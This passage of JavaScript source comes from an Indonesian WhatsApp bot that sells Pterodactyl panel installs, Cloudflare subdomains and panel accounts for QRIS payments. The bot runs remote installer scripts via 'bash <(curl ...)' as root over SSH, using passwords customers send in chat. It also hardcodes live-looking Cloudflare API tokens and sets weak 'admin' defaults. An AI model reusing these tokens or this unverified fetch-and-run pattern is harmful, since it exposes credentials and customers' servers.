        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await client.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

 await db.users[m.sender].saweria.exp();

 while (db.users[m.sender].status_deposit) {
 await sleep(8000);
 
 // Updated API request to check the payment status using new API URL and API key
 const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
 const req = await resultcek.data.amount;
 if (req == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;

 await client.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi panel" }, { quoted: db.users[m.sender].saweria.msg });
 delete db.users[m.sender].saweria; 

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await client.sendMessage(m.chat, {text: teks}, {quoted: loli})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('New York\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Danny S8X\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Danny S8X\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}

}
}
break

case "jasainstallpanel":
{
 if (!text || !text.split("|")) return reply(example("ipvps|pwvps|domain.com|node.com|ram"));
 let vii = text.split("|");
 if (vii.length < 2) return reply(example("ipvps|pwvps|domain.com|node.com|ram"));
 
 global.installpanell = {
 vps: vii[0], 
 pwvps: vii[1],
 domain: vii[2],
 nodedomain: [3],
 rampanel: [4]
 };

 let jasa = `
 *_Silahkan Pilih Region (Lokasi)_*
 `;

 let buttons = [
 { buttonId: ".owner", buttonText: { displayText: "ᴏᴡɴᴇʀ" } },
 { buttonId: ".infobot", buttonText: { displayText: "ɪɴғᴏ ʙᴏᴛ" } }
 ];

 let buttonMessage = {
 video: {
         url: global.video 
       },
 caption: `${jasa}`,
 contextInfo: {
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: `Danny S8X OfficiaL`
 }
 },
 footer: `${footer}`,
 buttons: buttons,
 viewOnce: true,
 headerType: 6
 };

 const flowActions = [
 {
 buttonId: 'action',
 buttonText: { displayText: 'This Button List' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: "silahkan pilih region",
 sections: [
 {
 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ",
 highlight_label: "rekomendasi",
 rows: [
 { title: "Region Singapore", description: "RP 5.000", id: ".installbuyyer1" },
 { title: "Region NewYork", description: "RP 6.000", id: ".installbuyyer2" }
 ]
 }
 ]
 })
 },
 viewOnce: true
 }
 ];

 buttonMessage.buttons.push(...flowActions);

 await client.sendMessage(m.chat, buttonMessage, { quoted: loli }); // Use `m` here instead of `fkontak`
 };

break;

case "buydomain":
{
 if (!text || !text.split("|")) return reply(example("hostname|ipvps"));
 let vii = text.split("|");
 
 let hostname = vii[0].trim(); 
 let ip = vii[1].trim(); 

 let jasa = `
 *_Silahkan Pilih Domain_*
 `;

 let buttons = [
 { buttonId: ".owner", buttonText: { displayText: "ᴏᴡɴᴇʀ" } },
 { buttonId: ".infobot", buttonText: { displayText: "ɪɴғᴏ ʙᴏᴛ" } }
 ];

 let buttonMessage = {
 video: {
         url: global.video 
       },
 caption: `${jasa}`,
 contextInfo: {
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: `Danny S8X OfficiaL`
 }
 },
 footer: `${footer}`,
 buttons: buttons,
 viewOnce: true,
 headerType: 6
 };

 const flowActions = [
 {
 buttonId: 'action',
 buttonText: { displayText: 'This Button List' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: "Pilih Domain",
 sections: [
 {
 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ",
 highlight_label: "rekomendasi",
 rows: [
 { title: "fr3serv.my.id", description: "ᴀᴋᴛɪғ", id: `.domain1 ${hostname}|${ip}` },
 { title: "tokopanel.software", description: "ɴᴏɴᴀᴋᴛɪғ", id: `.domain2 ${hostname}|${ip}` }
 ]
 }
 ]
 })
 },
 viewOnce: true
 }
 ];

 buttonMessage.buttons.push(...flowActions);

 await client.sendMessage(m.chat, buttonMessage, { quoted: loli }); // Use `m` here instead of `fkontak`
 };

break;

case "domain1":
{
 if (m.isGroup) return reply("pembelian domain hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function subDomain1(hostname, ip) {
 return new Promise((resolve) => {
 let zone = "65a88f5deee3629dcf7ca40493a06f22";
 let apitoken = "vP0oD4FGJBpHvDKZGZFIq0Cb2fRcGV5RppLcvug5";
 let tld = "fr3serv.my.id";

 axios
 .post(
 `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
 {
 type: "A",
 name: hostname + "." + tld,
 content: ip,
 ttl: 3600,
 priority: 10,
 proxied: false,
 },
 {
 headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
 },
 }
 )
 .then((response) => {
 let res = response.data;
 if (res.success) {
 resolve({
 success: true,
 zone: res.result?.zone_name,
 name: res.result?.name,
 ip: res.result?.content,
 });
 } else {
 resolve({ success: false, error: "Unknown error occurred" });
 }
 })
 .catch((error) => {
 let err1 =
 error.response?.data?.errors?.[0]?.message ||
 error.response?.data?.errors ||
 error.response?.data ||
 error.response ||
 error.message;
 resolve({ success: false, error: String(err1) });
 });
 });
 }

 let raw1 = args?.join(" ")?.trim();
 if (!raw1) return reply("Mana host & IP-nya?");
 let host0 = raw1
 .split("|")[0]
 .trim()
 .replace(/[^a-z0-9.-]/gi, "");
 if (!host0) return reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
 let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
 if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
 return reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
 }

 const harga = 2500;

 try {
 // =======================
 // Buat QRIS
 // =======================
 const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${harga}&codeqr=${global.QrisOrderKuota}`);

 const teks3 = `
* INFORMASI PEMBAYARAN*
 
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Pembuatan Subdomain
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.
`;
 let msgQr = await client.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Buy Domain`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await client.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

 // =======================
 // Cek Pembayaran
 // =======================
 while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await sleep(8000);
 const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
 const req = resultcek.data;

 if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;
 clearTimeout(db.users[m.sender].saweria.exp);

 await client.sendMessage(m.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}  
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}  
 *• Barang :* Pembuatan Subdomain
 `}, { quoted: db.users[m.sender].saweria.msg });

 subDomain1(host0, ip1).then((result) => {
 if (result.success) {
 reply(`*_Berhasil Membeli Subdomain✅_*\n_Ip : ${result.ip}_\n_Hostname: ${result.name}_`);
 } else {
 reply(`Gagal membuat subdomain\nMsg: ${result.error}`);
 }
 });

 await client.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key });
 delete db.users[m.sender].saweria;
 }
 }
 } catch (error) {
 console.error('Error:', error);
 reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
 }
}
break;

case "domain2":
{
 if (m.isGroup) return reply("pembelian domain hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function subDomain1(hostname, ip) {
 return new Promise((resolve) => {
 let zone = "cc9638d4c289130ba070484625e6aefa";
 let apitoken = "bcAP5z3gHvmQTlQ59qNB9BWmf0JiGt0C99FU6SXs";
 let tld = "tokopanel.software";

 axios
 .post(
 `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
 {
 type: "A",
 name: hostname + "." + tld,
 content: ip,
 ttl: 3600,
 priority: 10,
 proxied: false,
 },
 {
 headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
 },
 }
 )
 .then((response) => {
 let res = response.data;
 if (res.success) {
 resolve({
 success: true,
 zone: res.result?.zone_name,
 name: res.result?.name,
 ip: res.result?.content,
 });
 } else {
 resolve({ success: false, error: "Unknown error occurred" });
 }
 })
 .catch((error) => {
 let err1 =
 error.response?.data?.errors?.[0]?.message ||
 error.response?.data?.errors ||
 error.response?.data ||
 error.response ||
 error.message;
 resolve({ success: false, error: String(err1) });
 });
 });
 }

 let raw1 = args?.join(" ")?.trim();
 if (!raw1) return reply("Mana host & IP-nya?");
 let host0 = raw1
 .split("|")[0]
 .trim()
 .replace(/[^a-z0-9.-]/gi, "");
 if (!host0) return reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
 let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
 if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
 return reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
 }

 const harga = 2500;

 try {
 // =======================
 // Buat QRIS
 // =======================
 const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${harga}&codeqr=${global.QrisOrderKuota}`);

 const teks3 = `
* INFORMASI PEMBAYARAN*
 
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Pembuatan Subdomain
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.
`;
let msgQr = await client.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Buy Domain`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await client.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

 // =======================
 // Cek Pembayaran
 // =======================
 while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await sleep(8000);
 const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
 const req = resultcek.data;

 if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;
 clearTimeout(db.users[m.sender].saweria.exp);

 await client.sendMessage(m.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Pembuatan Subdomain
 `}, { quoted: db.users[m.sender].saweria.msg });

 subDomain1(host0, ip1).then((result) => {
 if (result.success) {
 reply(`*_Berhasil Membeli Subdomain✅_*\n_Ip : ${result.ip}_\n_Hostname: ${result.name}_`);
 } else {
 reply(`Gagal membuat subdomain\nMsg: ${result.error}`);
 }
 });

 await client.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key });
 delete db.users[m.sender].saweria;
 }
 }
 } catch (error) {
 console.error('Error:', error);
 reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
 }
}
break;

case "buyownpanel": {
    if (m.isGroup) return reply("🔒 Pembelian Owner Panel Pterodactyl hanya bisa di dalam private chat!");
    if (db.users[m.sender].status_deposit) return reply("❗ Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
    if (!text) return reply(example("username"));
    if (text.includes(" ")) return reply("❌ Username tidak boleh memakai spasi!");

    let us = crypto.randomBytes(2).toString('hex');
    let Obj = {};
    Obj.harga = "20000"; 
    Obj.username = text.toLowerCase() + us;
    const UrlQr = global.qrisOrderKuota;

    const amount = Number(Obj.harga) + generateRandomNumber(20, 70);
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
    
    const teks3 = `
    🛒 *INFORMASI PEMBAYARAN*

        *💳 ID Transaksi :* ${get.data.result.transactionId}
        *💰 Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *📦 Barang :* Owmer Panel Pterodactyl
        *⏳ Pembayaran Expired :* 5 menit

        ⚠️ *Perhatian*: QRIS hanya berlaku dalam 5 menit. Jangan lewatkan kesempatan ini!`
let msgQr = await client.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Own Panel`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                    await client.sendMessage(db.users[m.sender].saweria.chat, {text: "❌ QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg});
                    await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    await clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data;
        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await clearInterval(db.users[m.sender].saweria.exp);
            await client.sendMessage(db.users[m.sender].saweria.chat, {text: `
            *✅ PEMBAYARAN BERHASIL DITERIMA*

            💳 *ID Transaksi:* ${db.users[m.sender].saweria.idDeposit}  
            💰 *Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}  
            📦 *Barang:* Owner Panel Pterodactyl
            `}, {quoted: db.users[m.sender].saweria.msg});
            
            let username = Obj.username;
            let email = username+"@gmail.com";
            let name = capital(username);
            let password = crypto.randomBytes(4).toString('hex');
            
            let f = await fetch(global.domain + "/api/application/users", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                },
                "body": JSON.stringify({
                    "email": email,
                    "username": username.toLowerCase(),
                    "first_name": name,
                    "last_name": "Admin",
                    "root_admin": true,
                    "language": "en",
                    "password": password.toString()
                })
            });
            let data = await f.json();
            if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
            let user = data.attributes;
            var teks = `
            *🎉 Berhasil Membuat Owner Panel ✅*

            📛 *ID User:* ${user.id}  
            👤 *Nama:* ${user.first_name}  
            💻 *Username:* ${user.username}  
            🔑 *Password:* ${password.toString()}  
            🌐 *Login di:* ${global.global.domain}  
            📱 *Gabung Whatsapp:* ${global.linkgbbuypublic}

            *⚠️ Rules Owner Panel*  
            1. 🚫 Jangan Maling SC, Ketahuan Maling? Akun Dihapus!  
            2. 💾 Simpan baik-baik Data Akun Ini!  
            3. 🚀 Gunakan Panel dengan Bijak!  
            4. 📸 Claim Garansi hanya dengan Bukti SS Chat Saat Pembelian.
            `;
            await client.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: null});
            await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break

case 'belistockscript': case 'belistocksc': case 'belistokscript': case 'belistoksc': case 'buystockscript': case 'buystokscript': case 'buystoksc': {
// Ensure the purchase only happens in private chat
    if (m.isGroup) {
        return client.sendMessage(m.chat, {text: "Pembelian Stock Script hanya bisa dilakukan di private chat."});
    }

    // Check if there is an ongoing transaction
    if (db.users[m.sender].status_deposit) {
        return client.sendMessage(m.chat, {text: "Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!"});
    }
    
const scriptPath = './source/database/scripts.json';

const scriptName = args.join(" ");
if (!scriptName) return reply(`❌ *Format salah!*\n📌 Contoh: ${prefix+command} NamaScript\nUntuk melihat daftar script, Ketik : *.listscript*`);

// Baca database
const scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));
const script = scriptsData.scripts.find(s => s.name.toLowerCase() === scriptName.toLowerCase());

// Validasi script
if (!script) return reply(`❌ *Script "${scriptName}" tidak ditemukan!*`);


    // QRIS untuk pembayaran hackback panel
    let harga = `${script.price}`; // Harga layanan stock sc
    let amount = harga;

    // Membuat permintaan pembayaran
    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

    // Mengirim QRIS kepada pengguna untuk pembayaran
    let teksPembayaran = `
*📄 INFORMASI PEMBAYARAN 📄*
  
*• Nama Sc :* ${script.name}
*• Harga :* Rp. ${harga}
*• Layanan :* Stock Script

Silahkan scan QRIS di atas untuk melakukan pembayaran.`;
        let msgQr = await client.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl},  
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})
    
        // Menyimpan data transaksi
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.idtransaksi,
        amount: get.data.result.jumlah.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
                    await client.sendMessage(db.users[m.sender].saweria.chat, {
                        text: "QRIS pembayaran telah expired!"
                    }, { quoted: db.users[m.sender].saweria.msg });
                    await client.sendMessage(db.users[m.sender].saweria.chat, {
                        delete: db.users[m.sender].saweria.msg.key
                    });
                    db.users[m.sender].status_deposit = false;
                    clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000); // Waktu kadaluwarsa 5 menit
        }
    };

    // Memulai timer kadaluwarsa pembayaran
    await db.users[m.sender].saweria.exp();

    // Mengecek status pembayaran secara berkala
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
        await sleep(15000);

        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
      const req = resultcek.data;

      if (client[m.sender] && req?.result?.amount == client[m.sender].amount) {
            db.users[m.sender].status_deposit = false;
            clearInterval(db.users[m.sender].saweria.exp);
            

await client.sendMessage(m.chat, {
document: fs.readFileSync(script.filePath),
mimetype: 'application/zip',
fileName: `${script.name}.zip`,
caption: `✅ *Berhasil membeli script!*\n📜 *Nama* : ${script.name}\n📝 *Deskripsi* : ${script.description}\n💰 *Harga* : Rp ${harga}`
});


// Notifikasi ke owner
const ownerNumber = "6283132860356@s.whatsapp.net";
await client.sendMessage(ownerNumber, {
text: `
📢 *NOTIFIKASI PEMBELIAN SCRIPT*
🧑‍💻 *Pembeli*: ${m.sender}
📜 *Script*: ${script.name}
💰 *Harga*: Rp ${harga}
`
});
  }
 }
}
break;

case "buyreseller": case "buyresellerpanel": {
    // Ensure the purchase only happens in private chat
    if (m.isGroup) {
        return client.sendMessage(m.chat, {text: "Pembelian Reseller Panel hanya bisa dilakukan di private chat."});
    }

    // Check if there is an ongoing transaction
    if (db.users[m.sender].status_deposit) {
        return client.sendMessage(m.chat, {text: "Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!"});
    }

    // Inform the user how to proceed with the purchase
    let teks = `
    \`Untuk membeli Reseller Panel, ketik perintah berikut:\`
    Contoh penggunaan: *.buyresellerpanel 1*
    Pilihan: 1 (Rp 10000)
    `;
    if (!text) return client.sendMessage(m.chat, {text: teks});

    let Obj = {};
    let cmd = text.toLowerCase();
    if (cmd === "1") {
        Obj.harga = "10000"; // Harga untuk Reseller Panel
    } else {
        return client.sendMessage(m.chat, {text: teks});
    }

    // QRIS Order URL
    const UrlQr = global.qrisOrderKuota;

    // Function to generate a random value for payment amount
    let amount = Number(Obj.harga) + Math.floor(Math.random() * (250 - 110 + 1)) + 110;
    
    // Create payment request
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
    
    // Message to user with payment info and QR code
    const teks3 = `
    *INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
